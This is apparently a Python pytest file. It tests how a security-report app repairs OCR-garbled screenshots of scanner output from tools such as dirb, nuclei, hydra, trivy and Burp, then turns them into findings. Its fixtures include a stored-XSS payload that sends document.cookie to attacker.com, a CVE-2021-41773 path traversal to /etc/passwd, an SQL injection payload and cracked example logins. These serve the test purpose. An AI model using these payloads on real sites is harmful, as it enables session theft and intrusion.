# -*- coding: utf-8 -*-
"""A screenshot of scanner output gives the findings its text gives.

    pytest tests/test_ocr_screenshot_repair.py -v

Measured by rendering every console format in tests/fixtures as a screenshot
(dark terminal, light, and Courier on purple saved as JPEG), reading it with the
app's own OCR and comparing the findings with the text's. Before: 9 of 20 tools
gave the same findings, and a Burp proof screenshot gave none. After: all 20 in
all three styles. The broken strings below are what OCR actually returned.

See src/core/parsers/ocr_text.py.
"""
import os

import pytest

from src.core.parsers import parse_tool_file
from src.core.parsers.ocr_text import findings_from_image, reading_score, repair_ocr_text


def _all(found):
    a, i = found
    return (a or []) + (i if isinstance(i, list) else [])


def _key(found):
    return sorted((f.title, str(f.severity), str(f.target)) for f in found)


# ── each OCR habit, as measured, is repaired ─────────────────────────────────

@pytest.mark.parametrize("broken, repaired", [
    # dirb loses the "|", or reads it as "1", with debris after the colon
    ("+ http://shop.test/.git/HEAD (CODE:200SIZE:23)", "(CODE:200|SIZE:23)"),
    ("+ http://shop.test/server-status (CODE:4031SIZE:277)", "(CODE:403|SIZE:277)"),
    ("+ http://shop.test/.git/HEAD (CODE: - 2001SIZE:23)", "(CODE:200|SIZE:23)"),
    # feroxbuster: the "l" of the line count read as "1"
    ("200 GET 21 2w 23c http://shop.test/.git/HEAD", "200 GET 21l 2w 23c http://shop.test/.git/HEAD"),
    # enum4linux: the "//" of a share path
    ("7/10.0.0.8/public Mapping: OK Listing: OK Writing: N/A", "//10.0.0.8/public Mapping: OK"),
    ("1/10.0.0.8/public Mapping: OK Listing: OK Writing: N/A", "//10.0.0.8/public Mapping: OK"),
    # hydra: "]" read as "1", both brackets read as "1", a space between them
    ("[221[ssh] host: 172.201.152.88 login: admin password: admin123", "[22][ssh] host:"),
    ("[2211ssh] host: 172.201.152.88 login: admin password: admin123", "[22][ssh] host:"),
    ("[22] [ssh] host: 10.0.0.5 login: admin password: Summer2024!", "[22][ssh] host:"),
    # nuclei: brackets read as "(", ")", "l", or lost, and a hyphen as a space
    ("http-missing-security headers: :x-frame-options] [http] [info] http://shop.test",
     "[http-missing-security-headers:x-frame-options] [http] [info] http://shop.test"),
    ('(apache-detect] [http] [infol http://shop.test ["Apache/2.4.49 (Unix)"]',
     "[apache-detect] [http] [info] http://shop.test"),
    ("git-config) [http] [medium] http://shop.test/.git/config", "[git-config] [http] [medium]"),
    ("[CVE-2021-41773] [http] [critical] http://shop.test/cgi-bin/.82e/.82e/etc/passwd", "/.%2e/.%2e/etc/passwd"),
    # gobuster / ffuf: a lost leading "/" or "."
    ("config.php.bak (Status: 200) [Size: 4410]", "/config.php.bak (Status: 200)"),
    ("git/HEAD [Status: 200, Size: 23, Words: 2, Lines: 2, Duration: 12ms]", ".git/HEAD [Status: 200"),
    # a URL's "://" split or short of a slash; "Url" read "Ur1"
    ("[+] Url: https : //172.201.152.88", "[+] Url: https://172.201.152.88"),
    ("[+] Ur1/Domain : http: //shop.test/", "[+] Url/Domain : http://shop.test/"),
    ("- Scanning URL: http: /shop.test/ ----", "http://shop.test/"),
    # a CVE id that lost a hyphen; a cipher-suite name with spaces for underscores
    ("zlib1g CVE 2022-37434 CRITICAL fixed", "CVE-2022-37434"),
    ("TLS_ RSA WITH AES_128 CBC_SHA (dh 2048) - Vulnerable to LUCKY13", "TLS_RSA_WITH_AES_128_CBC_SHA (dh 2048)"),
    # a Burp exchange with its spaces squeezed out, and Host without its colon
    ("POST/user/profile/update HTTP/1.1", "POST /user/profile/update HTTP/1.1"),
    ("HTTP/1.1 200OK", "HTTP/1.1 200 OK"),
    ("Host app.xyz-corp-internal.com", "Host: app.xyz-corp-internal.com"),
    # a dash read as "i" between words
    ("Title: AND boolean-based blind i WHERE or HAVING clause", "blind - WHERE"),
])
def test_each_measured_ocr_habit_is_repaired(broken, repaired):
    assert repaired in repair_ocr_text(broken)


def test_text_that_is_already_right_passes_through():
    for line in ("[CVE-2021-41773] [http] [critical] http://shop.test/x",
                 "https://avd.aquasec.com/nvd/cve-2023-0286",       # lower case kept in a URL
                 "[22][ssh] host: 10.0.0.5   login: admin   password: x",
                 "//10.0.0.8/public\tMapping: OK Listing: OK Writing: N/A",
                 "/admin                (Status: 301) [Size: 313]",
                 "+ http://shop.test/.git/HEAD (CODE:200|SIZE:23)",
                 "| [!] Title: WordPress 5.8.1 - Authenticated Stored XSS",
                 "I think the server is fine"):
        assert repair_ocr_text(line) == line, line


def test_sqlmap_fields_run_together_are_split_but_one_field_is_left():
    out = repair_ocr_text("Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1 AND 3761=3761")
    assert out.splitlines()[0].strip() == "Title: AND boolean-based blind - WHERE or HAVING clause"
    assert out.splitlines()[1].strip() == "Payload: id=1 AND 3761=3761"
    assert repair_ocr_text("| [!] Title: WordPress <= 5.8.2 - SQL Injection") == "| [!] Title: WordPress <= 5.8.2 - SQL Injection"


def test_hydra_split_over_three_lines_is_joined():
    out = repair_ocr_text("[221[ssh] host: 172.201.152.88\nlogin: admin\npassword: admin123")
    assert out == "[22][ssh] host: 172.201.152.88   login: admin   password: admin123"


def test_a_hydra_bracket_is_repaired_only_to_a_port_the_run_names():
    # 2211 is no port this run attacked, and ssh's default is 22 -- "[221" + "1" -> 22 is repaired;
    # but an unrelated service on an unrelated port is not guessed at.
    assert repair_ocr_text("[80801[custom-svc] host: 10.0.0.5 login: a password: b").startswith("[80801[")
    assert repair_ocr_text("[DATA] attacking custom-svc://10.0.0.5:8080/\n[80801[custom-svc] host: 10.0.0.5 login: a password: b"
                           ).splitlines()[1].startswith("[8080][custom-svc]")


@pytest.mark.parametrize("ocr, null_session", [
    ("[+] Server 10.0.0.8 allows sessions using password II\nusername", True),
    ("[+] Server 10.0.0.8 allows sessions using password 1I\nusername", True),
    ("[+] Server 10.0.0.8 allows sessions using username a I password :\n[+] Got domain/workgroup name: WORKGROUP", True),
    ("[+] Server 10.0.0.8 allows sessions using username 'guest', password ''", False),     # a named user
    ("[+] Server 10.0.0.8 allows sessions using username guest password II", False),
])
def test_enum4linux_null_session_is_restored_only_when_nothing_else_is_said(ocr, null_session):
    out = repair_ocr_text(ocr)
    assert ("allows sessions using username '', password ''" in out) is null_session


def test_a_trivy_table_without_its_borders_is_rebuilt():
    ocr = ("shop:1.0 (debian 11.6)\n"
           "Total: 2 (UNKNOWN: 0, LOW: 0, MEDIUM: 0, HIGH: 1, CRITICAL: 1)\n"
           "Library Vulnerability Severity Status I Installed Version Fixed Version Title\n"
           "openssl CVE-2023-0286 HIGH fixed I 1.1.1n-0+deb11u3 I 1.1.1n-0+deb11u4 openssl: X.400 address type confusion\n"
           "https://avd.aquasec.com/nvd/cve-2023-0286\n"
           "zlib1g CVE 2022-37434 CRITICAL fixed 1:1.2.11.dfsg-2+deb11u1 1:1.2.11.dfsg-2+deb11u2 zlib: heap-based buffer over-read\n")
    found = _all(parse_tool_file("ocr_trivy.png.txt", ocr, framework="vapt"))
    assert sorted((f.cve_list[0], f.severity) for f in found) == [("CVE-2022-37434", "CRITICAL"), ("CVE-2023-0286", "HIGH")]
    assert {f.target for f in found} == {"shop:1.0 (debian 11.6)"}


# ── only OCR text is repaired; a report file is parsed as written ─────────────

def test_only_ocr_text_is_repaired():
    broken = ("DIRB v2.22\n+ http://shop.test/.git/HEAD (CODE:200SIZE:23)\n"
              "+ http://shop.test/server-status (CODE:403SIZE:277)\n")
    assert len(_all(parse_tool_file("ocr_dirb.png.txt", broken, framework="vapt"))) == 2
    assert len(_all(parse_tool_file("dirb.txt", broken, framework="vapt"))) == 0


def _clean_samples():
    import test_kali_parser as K
    from fixtures.scanner_formats import S
    out = [(k, v[0], v[1]) for k, v in S.items()]
    out += [("nikto", "nikto.txt", K.NIKTO), ("sqlmap", "sqlmap.txt", K.SQLMAP), ("gobuster", "gobuster.txt", K.GOBUSTER),
            ("hydra", "hydra.txt", K.HYDRA), ("wpscan", "wpscan.txt", K.WPSCAN), ("nmap", "nmap.txt", K.NMAP_REAL)]
    return out


@pytest.mark.parametrize("name, fname, text", _clean_samples(), ids=[s[0] for s in _clean_samples()])
def test_the_repair_never_changes_what_clean_output_gives(name, fname, text):
    """Every format in the fixtures, as the tool wrote it: the same findings
    with and without the repair."""
    plain = _all(parse_tool_file(fname, text, framework="vapt"))
    repaired = _all(parse_tool_file("ocr_" + fname + ".txt", text, framework="vapt"))
    assert _key(plain) == _key(repaired)


# ── the Burp proof screenshot (what OCR read from shot_burp_xss.png) ─────────

BURP_XSS_OCR = """Burp Suite Professional-IVulnerability Proof- Stored XSS]
HTTP Request (Re peater Tab 1)
POST/user/profile/update HTTP/1.1
Host app.xyz-corp-internal.com
Authorization: BearereyJnDGCL.
Content-Type: application/json
"bio*'<script-tetch(htt-fetch(http/
attacker.com/steal?c='+
documentcookie)</script>

HTTP Response (200 OK
HTTP/1.1 200OK
Content-Type: application/json
'message" "Profile updated,
rendered_biot"<script-fetch...
}
[ALERTI Unsanitized HTML rendered!"""


def test_a_burp_proof_screenshot_is_a_finding_with_its_target():
    found = _all(parse_tool_file("ocr_shot_burp_xss.png.txt", BURP_XSS_OCR, framework="vapt"))
    assert [(f.title, f.severity) for f in found] == [("Visual PoC: Stored Cross-Site Scripting", "HIGH")]
    assert found[0].target == "app.xyz-corp-internal.com/user/profile/update"
    assert "stored by the application" in found[0].description            # the knowledge-base text
    assert found[0].confidence == "Tentative"                              # severity to be confirmed


def test_before_the_repair_it_was_not_recognised():
    """Pins why: the request and response lines were not seen."""
    assert _all(parse_tool_file("shot.txt", BURP_XSS_OCR, framework="vapt")) == []


# ── gobuster's output file names its site, not a redirect ────────────────────

def test_gobuster_output_file_target_is_the_site():
    from fixtures.scanner_formats import S
    found = _all(parse_tool_file(S["gobuster_outfile"][0], S["gobuster_outfile"][1], framework="vapt"))
    assert {f.target for f in found} == {"http://shop.test"}          # was "http://shop.test/admin/]"


# ── both readings of an image; the better one is kept ────────────────────────

class _F:
    def __init__(self, sev, target="http://shop.test"):
        self.severity, self.target, self.title = sev, target, "x"


def test_reading_score_prefers_vulnerabilities_then_real_targets():
    assert reading_score([_F("HIGH")]) > reading_score([_F("INFO"), _F("INFO")])
    assert reading_score([_F("HIGH", "http://shop.test")]) > reading_score([_F("HIGH", "targethost")])


@pytest.mark.parametrize("block, rows, chosen", [
    ("DIRB v2.22\n+ http://shop.test/a (CODE:200|SIZE:1)",                                    # 1 finding
     "DIRB v2.22\n+ http://shop.test/a (CODE:200|SIZE:1)\n+ http://shop.test/.git/HEAD (CODE:200|SIZE:23)", "rows"),
    ("DIRB v2.22\n+ http://shop.test/.git/HEAD (CODE:200|SIZE:23)",                           # a tie keeps
     "DIRB v2.22\n+ http://shop.test/.git/HEAD (CODE:200|SIZE:23)\nfooter", "block"),           # the first reading
])
def test_the_better_reading_is_kept(monkeypatch, block, rows, chosen):
    from src.core.parsers import doc_parsers
    monkeypatch.setattr(doc_parsers, "extract_text", lambda buf: block)
    monkeypatch.setattr(doc_parsers, "ocr_image_row_text", lambda b: rows)
    found, text = findings_from_image(b"png-bytes", "shot.png", framework="vapt")
    assert text == (rows if chosen == "rows" else block)


def test_the_upload_uses_the_shared_image_path():
    import inspect
    from src.core import bg_worker
    src = inspect.getsource(bg_worker)
    assert "from src.core.parsers.ocr_text import findings_from_image" in src
    assert "if not ocr_findings and fd.get(\"bytes\"):" not in src        # row reading only on nothing


# ── end to end through the real OCR (skipped where its models are absent) ────

def test_a_real_screenshot_through_the_real_ocr():
    """A terminal screenshot of this text, Courier 15 on a dark background.

    Kept as a file rather than drawn here: drawing needs Courier, which only
    Windows has. On the Linux CI runner the test fell back to Pillow's bitmap
    font, which OCR cannot read, and failed with no findings."""
    pytest.importorskip("doctr")
    text = ("DIRB v2.22\n---- Scanning URL: http://shop.test/ ----\n"
            "+ http://shop.test/.git/HEAD (CODE:200|SIZE:23)\n"
            "+ http://shop.test/server-status (CODE:403|SIZE:277)\n")
    shot = os.path.join(os.path.dirname(os.path.abspath(__file__)), "fixtures",
                        "dirb_terminal_screenshot.jpg")
    with open(shot, "rb") as f:
        image_bytes = f.read()
    try:
        found, _ = findings_from_image(image_bytes, "dirb_shot.jpg", framework="vapt")
    except Exception as err:                       # OCR models not downloaded here
        pytest.skip(f"OCR unavailable: {err}")
    expected = _all(parse_tool_file("dirb.txt", text, framework="vapt"))
    assert _key(found) == _key(expected)
